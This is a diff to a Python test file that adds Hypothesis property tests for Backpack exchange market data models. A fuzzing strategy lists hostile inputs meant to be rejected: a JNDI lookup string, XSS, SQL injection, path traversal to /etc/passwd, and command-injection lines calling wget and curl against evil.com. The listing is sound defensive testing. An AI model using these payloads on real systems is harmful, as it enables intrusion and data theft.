@@ -1,157 +1,848 @@
-"""Unit tests for Backpack raw market data models.
+"""Property-based tests for Backpack raw market data models.
 
-Tests validation and processing of market data from the Backpack exchange API
-including tickers, order books, and other market-related data structures.
+These tests validate critical market data models that process external trading market information.
+The models tested here are essential for market discovery, price feeds, and order book operations.
+
+SECURITY CRITICAL: These raw models protect against:
+- Malicious market data that could manipulate price calculations
+- Financial precision errors in tick sizes and price increments
+- Buffer overflow attacks through oversized market identifiers
+- Injection attacks through market symbols and metadata
+- Order book manipulation through malformed bid/ask data
+- Ticker manipulation that could affect trading decisions
+
+Property testing ensures comprehensive coverage of market data edge cases and adversarial inputs.
 """
 
-import json
-from typing import Any, TypeGuard
+from decimal import Decimal
+from typing import Any
 
 import pytest
+from hypothesis import given, strategies as st, assume
+from hypothesis.strategies import SearchStrategy
 from pydantic import ValidationError
 
 from cyberdelta.apis.backpack.models.bp_raw_market import (
     BackpackRawDepthUpdateEvent,
     BackpackRawMarketResponse,
     BackpackRawOpenInterest,
+    BackpackRawOrderBook,
+    BackpackRawPriceFilter,
+    BackpackRawQuantityFilter,
+    BackpackRawOrderBookFilters,
     BackpackRawTickerEvent,
     BackpackRawTickerResponse,
 )
-from cyberdelta.apis.exceptions.parsing import StructureTypeError
+from cyberdelta.apis.exceptions.field_validation import DecimalFiniteError
+from cyberdelta.apis.exceptions.parsing import SequenceLengthError, StructureTypeError
 from cyberdelta.exceptions.field_validation import TypeFieldError
-from cyberdelta.exceptions.parsing import DateTimeParsingError, EmptyStringError
-from tests.common_symbols import BTC_USDC_BP, ETH_USDC_BP, SOL_USDC_BP
+from cyberdelta.exceptions.parsing import (
+    DateTimeParsingError,
+    EmptyStringError,
+    TimestampFormatError,
+)
 
 
-def _is_nested_list_with_elements(value: object) -> TypeGuard[list[list[Any]]]:
-    """Senior-level TypeGuard for nested list structures in order book data.
-
-    Returns:
-        True if value is a non-empty list containing lists, False otherwise.
-    """
-    if not isinstance(value, list) or not value:
-        return False
-    # Check if first element is a list - sufficient for type narrowing
-    return isinstance(value[0], list)
+# =============================================================================
+# HYPOTHESIS STRATEGIES FOR MARKET DATA MODEL TESTING
+# =============================================================================
 
 
-def _has_minimum_list_elements(value: list[Any], min_count: int) -> TypeGuard[list[Any]]:
-    """Senior-level TypeGuard for ensuring minimum list element count.
+def market_decimal_strategy() -> SearchStrategy[str]:
+    """Generate decimal strings for market financial fields."""
+    return st.one_of([
+        # Market price/volume amounts
+        st.decimals(min_value=Decimal("0"), max_value=Decimal("10000000"), places=8).map(str),
+        st.decimals(min_value=Decimal("0"), max_value=Decimal("1000000"), places=6).map(str),
+        # Common market values
+        st.just("0"),
+        st.just("0.0"),
+        st.just("0.01"),  # Minimum tick
+        st.just("1000.50"),  # Mid-range price
+        st.just("0.00000001"),  # Minimum precision
+        st.just("999999.99999999"),  # Large price
+        # Scientific notation (valid for decimal parsing)
+        st.just("1e6"),
+        st.just("1.5e3"),
+        st.just("2.5e-4"),
+    ])
 
-    Returns:
-        True if list has at least min_count elements, False otherwise.
-    """
-    return len(value) >= min_count
+
+def market_symbol_strategy() -> SearchStrategy[str]:
+    """Generate valid market symbol strings."""
+    return st.one_of([
+        # Common trading pairs
+        st.sampled_from(["BTC_USDC", "ETH_USDC", "SOL_USDC", "AVAX_USDC", "ARB_USDC"]),
+        # Valid symbol formats
+        st.text(
+            min_size=3,
+            max_size=64,
+            alphabet=st.characters(
+                whitelist_categories=["Lu", "Ll", "Nd"], whitelist_characters="_-"
+            ),
+        ).filter(lambda x: "_" in x and len(x.encode("utf-8")) <= 64),
+        # Edge cases
+        st.text(min_size=1, max_size=64).filter(
+            lambda x: x.strip() and len(x.encode("utf-8")) <= 64
+        ),
+    ])
 
 
-# --- BackpackRawMarket ---
-def valid_market() -> dict[str, Any]:
-    """Return valid market for testing."""
+def asset_symbol_strategy() -> SearchStrategy[str]:
+    """Generate valid asset symbol strings."""
+    return st.one_of([
+        # Common assets
+        st.sampled_from(["BTC", "ETH", "SOL", "USDC", "USDT", "AVAX", "ARB"]),
+        # Valid asset formats
+        st.text(
+            min_size=2, max_size=64, alphabet=st.characters(whitelist_categories=["Lu", "Ll", "Nd"])
+        ),
+        # Edge cases
+        st.text(min_size=1, max_size=64).filter(
+            lambda x: x.strip() and len(x.encode("utf-8")) <= 64
+        ),
+    ])
+
+
+def market_type_strategy() -> SearchStrategy[str]:
+    """Generate valid market type strings."""
+    return st.one_of([
+        st.sampled_from(["Spot", "Perpetual", "Future"]),
+        st.text(min_size=1, max_size=64).filter(lambda x: x.strip()),
+    ])
+
+
+def order_book_state_strategy() -> SearchStrategy[str]:
+    """Generate valid order book state strings."""
+    return st.one_of([
+        st.sampled_from(["NORMAL", "HALTED", "SUSPENDED", "MAINTENANCE"]),
+        st.text(min_size=1, max_size=64).filter(lambda x: x.strip()),
+    ])
+
+
+def timestamp_strategy() -> SearchStrategy[Any]:
+    """Generate valid timestamp values."""
+    return st.one_of([
+        # Unix timestamps (milliseconds)
+        st.integers(min_value=1000000000000, max_value=2000000000000),
+        # Unix timestamps (seconds)
+        st.integers(min_value=1000000000, max_value=2000000000),
+        # Float timestamps
+        st.floats(
+            min_value=1000000000.0, max_value=2000000000.0, allow_nan=False, allow_infinity=False
+        ),
+        # ISO format strings
+        st.just("2023-03-15T12:00:00Z"),
+        st.just("2024-01-01T00:00:00.000Z"),
+        # String timestamps
+        st.integers(min_value=1000000000000, max_value=2000000000000).map(str),
+        # None for optional fields
+        st.none(),
+    ])
+
+
+@st.composite
+def price_filter_data(draw) -> dict[str, Any]:
+    """Generate valid price filter data."""
     return {
-        "symbol": BTC_USDC_BP.value,
-        "baseSymbol": "BTC",
-        "quoteSymbol": "USDC",
-        "marketType": "Spot",
-        "filters": {
-            "price": {"minPrice": "0.01", "maxPrice": "1000000.0", "tickSize": "0.01"},
-            "quantity": {"minQuantity": "0.0001", "maxQuantity": "1000.0", "stepSize": "0.0001"},
-        },
-        "orderBookState": "NORMAL",
-        "createdAt": "2024-01-01T00:00:00.000Z",
+        "minPrice": draw(market_decimal_strategy()),
+        "maxPrice": draw(st.one_of([market_decimal_strategy(), st.none()])),
+        "tickSize": draw(market_decimal_strategy()),
     }
 
 
-def test_BackpackRawMarket_happy_path() -> None:
-    """Test BackpackRawMarket happy path."""
-    obj = BackpackRawMarketResponse.model_validate(valid_market())
-    assert obj.symbol == BTC_USDC_BP.value
-    assert obj.base_symbol == "BTC"
-    assert obj.quote_symbol == "USDC"
+@st.composite
+def quantity_filter_data(draw) -> dict[str, Any]:
+    """Generate valid quantity filter data."""
+    return {
+        "minQuantity": draw(market_decimal_strategy()),
+        "maxQuantity": draw(st.one_of([market_decimal_strategy(), st.none()])),
+        "stepSize": draw(market_decimal_strategy()),
+    }
 
 
-def test_BackpackRawMarket_missing_required_fields() -> None:
-    """Test BackpackRawMarket missing required fields."""
-    required_fields = [
-        "symbol",
-        "baseSymbol",
-        "quoteSymbol",
-        "marketType",
-        "filters",
-        "orderBookState",
-        "createdAt",
+@st.composite
+def order_book_filters_data(draw) -> dict[str, Any]:
+    """Generate valid order book filters data."""
+    return {
+        "price": draw(price_filter_data()),
+        "quantity": draw(quantity_filter_data()),
+    }
+
+
+@st.composite
+def valid_market_response_data(draw) -> dict[str, Any]:
+    """Generate valid market response data structure."""
+    return {
+        "symbol": draw(market_symbol_strategy()),
+        "baseSymbol": draw(asset_symbol_strategy()),
+        "quoteSymbol": draw(asset_symbol_strategy()),
+        "marketType": draw(market_type_strategy()),
+        "filters": draw(order_book_filters_data()),
+        "orderBookState": draw(order_book_state_strategy()),
+        "createdAt": draw(st.text(min_size=5, max_size=64)),  # Timestamp string
+    }
+
+
+@st.composite
+def valid_ticker_response_data(draw) -> dict[str, Any]:
+    """Generate valid ticker response data structure."""
+    return {
+        "symbol": draw(market_symbol_strategy()),
+        "firstPrice": draw(market_decimal_strategy()),
+        "lastPrice": draw(market_decimal_strategy()),
+        "high": draw(market_decimal_strategy()),
+        "low": draw(market_decimal_strategy()),
+        "priceChange": draw(market_decimal_strategy()),
+        "priceChangePercent": draw(market_decimal_strategy()),
+        "volume": draw(market_decimal_strategy()),
+        "quoteVolume": draw(market_decimal_strategy()),
+        "trades": draw(st.text(min_size=1, max_size=64)),
+    }
+
+
+@st.composite
+def valid_ticker_event_data(draw) -> dict[str, Any]:
+    """Generate valid ticker event data structure."""
+    return {
+        "s": draw(market_symbol_strategy()),
+        "c": draw(market_decimal_strategy()),  # last_price
+        "h": draw(market_decimal_strategy()),  # high
+        "l": draw(market_decimal_strategy()),  # low
+        "o": draw(st.one_of([market_decimal_strategy(), st.none()])),  # open_price
+        "v": draw(market_decimal_strategy()),  # volume
+        "V": draw(market_decimal_strategy()),  # quote_volume
+        "priceChangePercent": draw(st.one_of([market_decimal_strategy(), st.none()])),
+        "e": draw(st.one_of([st.text(min_size=1, max_size=32), st.none()])),  # event_type
+        "E": draw(timestamp_strategy()),  # event_time
+    }
+
+
+@st.composite
+def order_book_level_data(draw) -> list[Any]:
+    """Generate valid order book level data (price, quantity tuple)."""
+    return [
+        draw(market_decimal_strategy()),  # price
+        draw(market_decimal_strategy()),  # quantity
     ]
-    for field in required_fields:
-        p: dict[str, Any] = valid_market().copy()
-        del p[field]
-        with pytest.raises(ValidationError):
-            BackpackRawMarketResponse.model_validate(p)
 
 
-def test_BackpackRawMarket_wrong_type_fields() -> None:
-    """Test BackpackRawMarket wrong type fields."""
-    p: dict[str, Any] = valid_market().copy()
-    p["symbol"] = 123
-    with pytest.raises(TypeError):
-        BackpackRawMarketResponse.model_validate(p)
-    p = valid_market().copy()
-    p["baseSymbol"] = ["BTC"]  # Fixed: baseAsset -> baseSymbol to match model
-    with pytest.raises(TypeError):
-        BackpackRawMarketResponse.model_validate(p)
+@st.composite
+def valid_order_book_data(draw) -> dict[str, Any]:
+    """Generate valid order book data structure."""
+    return {
+        "bids": draw(st.lists(order_book_level_data(), min_size=0, max_size=10)),
+        "asks": draw(st.lists(order_book_level_data(), min_size=0, max_size=10)),
+        "lastUpdateId": draw(st.text(min_size=1, max_size=64)),
+        "timestamp": draw(timestamp_strategy()),
+    }
 
 
-def test_BackpackRawMarket_invalid_format_fields() -> None:
-    """Test BackpackRawMarket invalid format fields."""
-    p: dict[str, Any] = valid_market().copy()
-    p["symbol"] = ""
-    with pytest.raises(EmptyStringError):
-        BackpackRawMarketResponse.model_validate(p)
-    p = valid_market().copy()
-    p["baseSymbol"] = "   "
-    with pytest.raises(EmptyStringError):
-        BackpackRawMarketResponse.model_validate(p)
+@st.composite
+def valid_depth_update_event_data(draw) -> dict[str, Any]:
+    """Generate valid depth update event data structure."""
+    return {
+        "b": draw(
+            st.one_of([st.lists(order_book_level_data(), min_size=0, max_size=5), st.none()])
+        ),
+        "a": draw(
+            st.one_of([st.lists(order_book_level_data(), min_size=0, max_size=5), st.none()])
+        ),
+        "U": draw(st.text(min_size=1, max_size=64)),  # first_update_id
+        "u": draw(st.text(min_size=1, max_size=64)),  # last_update_id
+        "e": draw(st.one_of([st.text(min_size=1, max_size=32), st.none()])),  # event_type
+        "E": draw(timestamp_strategy()),  # event_time
+        "T": draw(timestamp_strategy()),  # engine_time
+    }
 
 
-def test_BackpackRawMarket_extra_field() -> None:
-    """Test BackpackRawMarket extra field."""
-    p: dict[str, Any] = valid_market().copy()
-    p["foo"] = "bar"
-    # Business logic changed: extra="ignore" now, so extra fields are allowed
-    market = BackpackRawMarketResponse.model_validate(p)
-    # Verify the model was created successfully and extra field was ignored
-    assert market.symbol == BTC_USDC_BP.value
-    assert not hasattr(market, "foo")
+def malicious_market_strategy() -> SearchStrategy[Any]:
+    """Generate malicious strings for market security testing."""
+    return st.one_of([
+        # Financial manipulation attempts
+        st.just("${jndi:ldap://evil.com/steal-prices}"),
+        st.just("999999999999999999999999999999.99"),  # Overflow attempt
+        st.just("../../etc/passwd"),  # Path traversal
+        # XSS attempts
+        st.just("<script>alert('market-xss')</script>"),
+        st.just("<img src=x onerror=alert(document.cookie)>"),
+        # SQL injection attempts
+        st.just("'; DROP TABLE markets;--"),
+        st.just("1' UNION SELECT * FROM prices--"),
+        # Buffer overflow attempts
+        st.text(min_size=10000, max_size=50000),
+        st.just("M" * 10000),
+        # Unicode attacks
+        st.just("\udce2\udc28\udc00"),  # Lone surrogates
+        st.just("\x00\x01\x02"),  # Control characters
+        # Format string attacks
+        st.just("%s%s%s%s%n"),
+        st.just("%x%x%x%x"),
+        # Command injection
+        st.just("; wget evil.com/backdoor"),
+        st.just("`curl evil.com/exfiltrate`"),
+        # NoSQL injection
+        st.just("'; return db.markets.find(); //"),
+        # JSON injection
+        st.just('{"$where": "this.price > 1000000"}'),
+        # Ticker manipulation
+        st.just("BTC_USDC'; UPDATE tickers SET price=0;--"),
+    ])
 
 
-def test_BackpackRawMarket_corruption_cases() -> None:
-    """Test BackpackRawMarket corruption cases."""
-    # Null required
-    p: dict[str, Any] = valid_market().copy()
-    p["symbol"] = None
-    with pytest.raises(TypeError):
-        BackpackRawMarketResponse.model_validate(p)
-    # Unicode/control chars
-    p = valid_market().copy()
-    p["symbol"] = "BTC_USDC\x00"
-    obj = BackpackRawMarketResponse.model_validate(p)
-    assert BTC_USDC_BP.value in obj.symbol
-    # Excessive length
-    p = valid_market().copy()
-    p["symbol"] = BTC_USDC_BP.value * 1000
-    with pytest.raises(TypeFieldError):
-        BackpackRawMarketResponse.model_validate(p)
-    # Truncated JSON
-    bad_json = '{"symbol": BTC_USDC_BP.value, "baseSymbol": "BTC"'
-    with pytest.raises(json.JSONDecodeError):
-        json.loads(bad_json)
+def invalid_market_type_strategy() -> SearchStrategy[Any]:
+    """Generate invalid types for market field validation testing."""
+    return st.one_of([
+        st.none(),
+        st.integers(),
+        st.floats(),
+        st.booleans(),
+        st.lists(st.text()),
+        st.dictionaries(st.text(), st.text()),
+        st.binary(),
+        # Complex nested structures
+        st.lists(st.dictionaries(st.text(), st.integers())),
+        st.dictionaries(st.text(), st.lists(st.text())),
+    ])
 
 
-def test_BackpackRawMarket_real_json_example() -> None:
-    """Validate BackpackRawMarket using a real JSON payload from the Backpack OpenAPI spec.
+# =============================================================================
+# PROPERTY TESTS FOR BACKPACK RAW MARKET RESPONSE MODEL
+# =============================================================================
 
-    Includes edge values.
-    """
+
+class TestBackpackRawMarketResponseProperties:
+    """Property-based tests for BackpackRawMarketResponse validation and security."""
+
+    @given(market_data=valid_market_response_data())
+    def test_market_validation_success_properties(self, market_data: dict[str, Any]) -> None:
+        """Property: Valid market data should always create valid BackpackRawMarketResponse objects."""
+        # Skip invalid nested filter data
+        try:
+            # Check price filter decimals
+            price_filter = market_data["filters"]["price"]
+            tick_size_val = Decimal(price_filter["tickSize"])
+            min_price_val = Decimal(price_filter["minPrice"])
+            assume(tick_size_val.is_finite() and min_price_val.is_finite())
+
+            if price_filter["maxPrice"] is not None:
+                max_price_val = Decimal(price_filter["maxPrice"])
+                assume(max_price_val.is_finite())
+
+            # Check quantity filter decimals
+            quantity_filter = market_data["filters"]["quantity"]
+            step_size_val = Decimal(quantity_filter["stepSize"])
+            min_quantity_val = Decimal(quantity_filter["minQuantity"])
+            assume(step_size_val.is_finite() and min_quantity_val.is_finite())
+
+            if quantity_filter["maxQuantity"] is not None:
+                max_quantity_val = Decimal(quantity_filter["maxQuantity"])
+                assume(max_quantity_val.is_finite())
+
+        except (ValueError, TypeError, KeyError):
+            assume(False)
+
+        # Skip empty or invalid strings
+        assume(market_data["symbol"].strip())
+        assume(market_data["baseSymbol"].strip())
+        assume(market_data["quoteSymbol"].strip())
+        assume(market_data["marketType"].strip())
+        assume(market_data["orderBookState"].strip())
+
+        obj = BackpackRawMarketResponse.model_validate(market_data)
+
+        # Property: Object should be created successfully
+        assert isinstance(obj, BackpackRawMarketResponse)
+
+        # Property: All fields should be preserved
+        assert obj.symbol == market_data["symbol"]
+        assert obj.base_symbol == market_data["baseSymbol"]
+        assert obj.quote_symbol == market_data["quoteSymbol"]
+        assert obj.market_type == market_data["marketType"]
+        assert obj.order_book_state == market_data["orderBookState"]
+
+        # Property: Nested filters should be properly typed
+        assert isinstance(obj.filters, BackpackRawOrderBookFilters)
+        assert isinstance(obj.filters.price, BackpackRawPriceFilter)
+        assert isinstance(obj.filters.quantity, BackpackRawQuantityFilter)
+
+        # Property: Model should be configured correctly
+        assert obj.model_config.get("extra") == "ignore"
+        assert obj.model_config.get("frozen") is True
+        assert obj.model_config.get("populate_by_name") is True
+
+    @given(
+        field_name=st.sampled_from([
+            "symbol",
+            "baseSymbol",
+            "quoteSymbol",
+            "marketType",
+            "orderBookState",
+        ]),
+        malicious_value=malicious_market_strategy(),
+    )
+    def test_market_security_boundary_properties(
+        self, field_name: str, malicious_value: Any
+    ) -> None:
+        """Property: Market model should reject malicious inputs safely."""
+        base_data = {
+            "symbol": "BTC_USDC",
+            "baseSymbol": "BTC",
+            "quoteSymbol": "USDC",
+            "marketType": "Spot",
+            "filters": {
+                "price": {"minPrice": "0.01", "maxPrice": "1000000.0", "tickSize": "0.01"},
+                "quantity": {
+                    "minQuantity": "0.0001",
+                    "maxQuantity": "1000.0",
+                    "stepSize": "0.0001",
+                },
+            },
+            "orderBookState": "NORMAL",
+            "createdAt": "2024-01-01T00:00:00.000Z",
+        }
+        base_data[field_name] = malicious_value
+
+        # Property: Malicious input should be rejected
+        with pytest.raises((ValidationError, TypeError, EmptyStringError, TypeFieldError)):
+            BackpackRawMarketResponse.model_validate(base_data)
+
+    @given(
+        field_name=st.sampled_from(["symbol", "baseSymbol", "quoteSymbol", "filters"]),
+        invalid_value=invalid_market_type_strategy(),
+    )
+    def test_market_type_safety_properties(self, field_name: str, invalid_value: Any) -> None:
+        """Property: Market model should enforce strict type safety."""
+        base_data = {
+            "symbol": "BTC_USDC",
+            "baseSymbol": "BTC",
+            "quoteSymbol": "USDC",
+            "marketType": "Spot",
+            "filters": {
+                "price": {"minPrice": "0.01", "maxPrice": "1000000.0", "tickSize": "0.01"},
+                "quantity": {
+                    "minQuantity": "0.0001",
+                    "maxQuantity": "1000.0",
+                    "stepSize": "0.0001",
+                },
+            },
+            "orderBookState": "NORMAL",
+            "createdAt": "2024-01-01T00:00:00.000Z",
+        }
+        base_data[field_name] = invalid_value
+
+        # Property: Wrong types should be rejected
+        with pytest.raises((ValidationError, TypeError)):
+            BackpackRawMarketResponse.model_validate(base_data)
+
+    @given(
+        filter_field=st.sampled_from(["tickSize", "minPrice", "stepSize", "minQuantity"]),
+        decimal_value=st.one_of([
+            # Valid decimals
+            st.just("0.01"),
+            st.just("1000.50"),
+            st.just("1e6"),
+            # Invalid decimals
+            st.just("NaN"),
+            st.just("inf"),
+            st.just("-inf"),
+            st.just("1..0"),
+            st.just("not_a_number"),
+            st.just(""),
+            st.just("   "),
+        ]),
+    )
+    def test_market_filter_decimal_validation_properties(
+        self, filter_field: str, decimal_value: str
+    ) -> None:
+        """Property: Market filter decimal fields should validate properly."""
+        market_data = {
+            "symbol": "BTC_USDC",
+            "baseSymbol": "BTC",
+            "quoteSymbol": "USDC",
+            "marketType": "Spot",
+            "filters": {
+                "price": {"minPrice": "0.01", "maxPrice": "1000000.0", "tickSize": "0.01"},
+                "quantity": {
+                    "minQuantity": "0.0001",
+                    "maxQuantity": "1000.0",
+                    "stepSize": "0.0001",
+                },
+            },
+            "orderBookState": "NORMAL",
+            "createdAt": "2024-01-01T00:00:00.000Z",
+        }
+
+        # Update the appropriate filter field
+        if filter_field in ["tickSize", "minPrice"]:
+            market_data["filters"]["price"][filter_field] = decimal_value
+        else:
+            market_data["filters"]["quantity"][filter_field] = decimal_value
+
+        try:
+            # Check if the value can be parsed as a finite decimal
+            decimal_val = Decimal(decimal_value.strip() if decimal_value else "")
+            is_finite = decimal_val.is_finite()
+            is_empty = not decimal_value.strip()
+
+            if is_finite and not is_empty:
+                # Property: Valid finite decimals should be accepted
+                obj = BackpackRawMarketResponse.model_validate(market_data)
+                assert isinstance(obj, BackpackRawMarketResponse)
+            else:
+                # Property: Non-finite or empty values should be rejected
+                with pytest.raises((ValidationError, EmptyStringError, DecimalFiniteError)):
+                    BackpackRawMarketResponse.model_validate(market_data)
+
+        except (ValueError, TypeError):
+            # Property: Unparseable decimal strings should be rejected
+            with pytest.raises(ValidationError):
+                BackpackRawMarketResponse.model_validate(market_data)
+
+
+# =============================================================================
+# PROPERTY TESTS FOR BACKPACK RAW TICKER RESPONSE MODEL
+# =============================================================================
+
+
+class TestBackpackRawTickerResponseProperties:
+    """Property-based tests for BackpackRawTickerResponse validation and security."""
+
+    @given(ticker_data=valid_ticker_response_data())
+    def test_ticker_validation_success_properties(self, ticker_data: dict[str, Any]) -> None:
+        """Property: Valid ticker data should always create valid BackpackRawTickerResponse objects."""
+        # Skip invalid decimal values
+        try:
+            decimal_fields = [
+                "firstPrice",
+                "lastPrice",
+                "high",
+                "low",
+                "priceChange",
+                "priceChangePercent",
+                "volume",
+                "quoteVolume",
+            ]
+            for field in decimal_fields:
+                decimal_val = Decimal(ticker_data[field])
+                assume(decimal_val.is_finite())
+        except (ValueError, TypeError):
+            assume(False)
+
+        # Skip empty strings
+        assume(ticker_data["symbol"].strip())
+        assume(ticker_data["trades"].strip())
+
+        obj = BackpackRawTickerResponse.model_validate(ticker_data)
+
+        # Property: Object should be created successfully
+        assert isinstance(obj, BackpackRawTickerResponse)
+
+        # Property: All fields should be preserved
+        assert obj.symbol == ticker_data["symbol"]
+        assert obj.first_price == ticker_data["firstPrice"]
+        assert obj.last_price == ticker_data["lastPrice"]
+        assert obj.volume == ticker_data["volume"]
+        assert obj.trades == ticker_data["trades"]
+
+        # Property: Model should be configured correctly
+        assert obj.model_config.get("extra") == "forbid"
+        assert obj.model_config.get("frozen") is True
+
+    @given(
+        field_name=st.sampled_from(["symbol", "firstPrice", "lastPrice", "volume"]),
+        malicious_value=malicious_market_strategy(),
+    )
+    def test_ticker_security_boundary_properties(
+        self, field_name: str, malicious_value: Any
+    ) -> None:
+        """Property: Ticker model should reject malicious inputs safely."""
+        base_data = {
+            "symbol": "BTC_USDC",
+            "firstPrice": "50000.00",
+            "lastPrice": "50250.50",
+            "high": "51000.00",
+            "low": "49500.00",
+            "priceChange": "250.50",
+            "priceChangePercent": "0.5",
+            "volume": "1000.5",
+            "quoteVolume": "50125000.0",
+            "trades": "1500",
+        }
+        base_data[field_name] = malicious_value
+
+        # Property: Malicious input should be rejected
+        with pytest.raises((ValidationError, TypeError, EmptyStringError, DecimalFiniteError)):
+            BackpackRawTickerResponse.model_validate(base_data)
+
+
+# =============================================================================
+# PROPERTY TESTS FOR BACKPACK RAW ORDER BOOK MODEL
+# =============================================================================
+
+
+class TestBackpackRawOrderBookProperties:
+    """Property-based tests for BackpackRawOrderBook validation and security."""
+
+    @given(order_book_data=valid_order_book_data())
+    def test_order_book_validation_success_properties(
+        self, order_book_data: dict[str, Any]
+    ) -> None:
+        """Property: Valid order book data should always create valid objects."""
+        # Skip invalid decimal values in bid/ask levels
+        try:
+            for levels in [order_book_data["bids"], order_book_data["asks"]]:
+                for level in levels:
+                    if len(level) == 2:
+                        price_val = Decimal(level[0])
+                        quantity_val = Decimal(level[1])
+                        assume(price_val.is_finite() and quantity_val.is_finite())
+                        assume(price_val >= 0 and quantity_val >= 0)  # Non-negative constraint
+        except (ValueError, TypeError, IndexError):
+            assume(False)
+
+        # Skip empty required strings
+        assume(order_book_data["lastUpdateId"].strip())
+
+        obj = BackpackRawOrderBook.model_validate(order_book_data)
+
+        # Property: Object should be created successfully
+        assert isinstance(obj, BackpackRawOrderBook)
+
+        # Property: Bids and asks should be lists of tuples
+        assert isinstance(obj.bids, list)
+        assert isinstance(obj.asks, list)
+
+        # Property: Each level should be a tuple of two strings
+        for bid in obj.bids:
+            assert isinstance(bid, tuple)
+            assert len(bid) == 2
+            assert isinstance(bid[0], str)  # price
+            assert isinstance(bid[1], str)  # quantity
+
+        for ask in obj.asks:
+            assert isinstance(ask, tuple)
+            assert len(ask) == 2
+            assert isinstance(ask[0], str)  # price
+            assert isinstance(ask[1], str)  # quantity
+
+    @given(
+        invalid_level_data=st.one_of([
+            st.just([]),  # Empty level
+            st.just(["price"]),  # Missing quantity
+            st.just(["price", "qty", "extra"]),  # Too many elements
+            st.just([123, 456]),  # Wrong types
+            st.just("not_a_list"),  # Not a list
+            st.none(),  # None
+        ])
+    )
+    def test_order_book_level_validation_properties(self, invalid_level_data: Any) -> None:
+        """Property: Order book levels should be validated properly."""
+        order_book_data = {
+            "bids": [invalid_level_data],
+            "asks": [["100.0", "1.0"]],
+            "lastUpdateId": "12345",
+            "timestamp": 1678886400000,
+        }
+
+        # Property: Invalid level data should be rejected
+        with pytest.raises((ValidationError, StructureTypeError, SequenceLengthError, TypeError)):
+            BackpackRawOrderBook.model_validate(order_book_data)
+
+
+# =============================================================================
+# PROPERTY TESTS FOR BACKPACK RAW DEPTH UPDATE EVENT MODEL
+# =============================================================================
+
+
+class TestBackpackRawDepthUpdateEventProperties:
+    """Property-based tests for BackpackRawDepthUpdateEvent validation and security."""
+
+    @given(depth_data=valid_depth_update_event_data())
+    def test_depth_update_validation_success_properties(self, depth_data: dict[str, Any]) -> None:
+        """Property: Valid depth update data should always create valid objects."""
+        # Skip invalid decimal values in bid/ask levels
+        try:
+            for field_key in ["b", "a"]:
+                levels = depth_data[field_key]
+                if levels is not None:
+                    for level in levels:
+                        if len(level) == 2:
+                            price_val = Decimal(level[0])
+                            quantity_val = Decimal(level[1])
+                            assume(price_val.is_finite() and quantity_val.is_finite())
+        except (ValueError, TypeError, IndexError):
+            assume(False)
+
+        # Skip empty required strings
+        assume(depth_data["U"].strip())
+        assume(depth_data["u"].strip())
+
+        obj = BackpackRawDepthUpdateEvent.model_validate(depth_data)
+
+        # Property: Object should be created successfully
+        assert isinstance(obj, BackpackRawDepthUpdateEvent)
+
+        # Property: Update IDs should be preserved
+        assert obj.first_update_id == depth_data["U"]
+        assert obj.last_update_id == depth_data["u"]
+
+        # Property: Optional bids/asks should handle None correctly
+        if depth_data["b"] is not None:
+            assert obj.bids is not None
+            assert isinstance(obj.bids, list)
+        else:
+            assert obj.bids is None
+
+        if depth_data["a"] is not None:
+            assert obj.asks is not None
+            assert isinstance(obj.asks, list)
+        else:
+            assert obj.asks is None
+
+    @given(
+        field_name=st.sampled_from(["U", "u", "b", "a"]),
+        malicious_value=malicious_market_strategy(),
+    )
+    def test_depth_update_security_boundary_properties(
+        self, field_name: str, malicious_value: Any
+    ) -> None:
+        """Property: Depth update model should reject malicious inputs safely."""
+        base_data = {
+            "b": [["100.0", "1.0"]],
+            "a": [["101.0", "1.0"]],
+            "U": "12345",
+            "u": "12346",
+            "e": "depthUpdate",
+            "E": 1678886400000,
+            "T": 1678886400100,
+        }
+        base_data[field_name] = malicious_value
+
+        # Property: Malicious input should be rejected
+        with pytest.raises((ValidationError, TypeError, EmptyStringError, StructureTypeError)):
+            BackpackRawDepthUpdateEvent.model_validate(base_data)
+
+
+# =============================================================================
+# INTEGRATION PROPERTY TESTS
+# =============================================================================
+
+
+class TestBackpackRawMarketIntegrationProperties:
+    """Integration property tests for all market models."""
+
+    @given(
+        market_data=valid_market_response_data(),
+        ticker_data=valid_ticker_response_data(),
+        order_book_data=valid_order_book_data(),
+    )
+    def test_market_models_consistency_properties(
+        self,
+        market_data: dict[str, Any],
+        ticker_data: dict[str, Any],
+        order_book_data: dict[str, Any],
+    ) -> None:
+        """Property: All market models should have consistent validation behavior."""
+        # Filter to valid inputs only
+        try:
+            # Validate market decimals
+            price_filter = market_data["filters"]["price"]
+            Decimal(price_filter["tickSize"])
+
+            # Validate ticker decimals
+            Decimal(ticker_data["firstPrice"])
+
+            # Validate order book levels
+            for levels in [order_book_data["bids"], order_book_data["asks"]]:
+                for level in levels:
+                    if len(level) == 2:
+                        Decimal(level[0])
+                        Decimal(level[1])
+
+        except (ValueError, TypeError, KeyError):
+            assume(False)
+
+        assume(market_data["symbol"].strip())
+        assume(ticker_data["symbol"].strip())
+        assume(order_book_data["lastUpdateId"].strip())
+
+        # Property: All models should validate successfully with valid data
+        market_obj = BackpackRawMarketResponse.model_validate(market_data)
+        ticker_obj = BackpackRawTickerResponse.model_validate(ticker_data)
+        order_book_obj = BackpackRawOrderBook.model_validate(order_book_data)
+
+        # Property: All should have consistent model configuration
+        assert market_obj.model_config.get("frozen") is True
+        assert ticker_obj.model_config.get("frozen") is True
+        assert order_book_obj.model_config.get("frozen") is True
+
+    @given(
+        malicious_data=st.dictionaries(
+            st.sampled_from(["symbol", "firstPrice", "lastPrice", "tickSize", "U", "u"]),
+            malicious_market_strategy(),
+        )
+    )
+    def test_market_models_security_boundary_properties(
+        self, malicious_data: dict[str, Any]
+    ) -> None:
+        """Property: All market models should consistently reject malicious inputs."""
+        # Try to validate as market response if it has market fields
+        if "symbol" in malicious_data or "tickSize" in malicious_data:
+            market_data = {
+                "symbol": malicious_data.get("symbol", "BTC_USDC"),
+                "baseSymbol": "BTC",
+                "quoteSymbol": "USDC",
+                "marketType": "Spot",
+                "filters": {
+                    "price": {
+                        "minPrice": "0.01",
+                        "maxPrice": "1000000.0",
+                        "tickSize": malicious_data.get("tickSize", "0.01"),
+                    },
+                    "quantity": {
+                        "minQuantity": "0.0001",
+                        "maxQuantity": "1000.0",
+                        "stepSize": "0.0001",
+                    },
+                },
+                "orderBookState": "NORMAL",
+                "createdAt": "2024-01-01T00:00:00.000Z",
+            }
+
+            # Property: Malicious market data should be rejected
+            with pytest.raises((ValidationError, TypeError, EmptyStringError, DecimalFiniteError)):
+                BackpackRawMarketResponse.model_validate(market_data)
+
+        # Try to validate as ticker if it has ticker fields
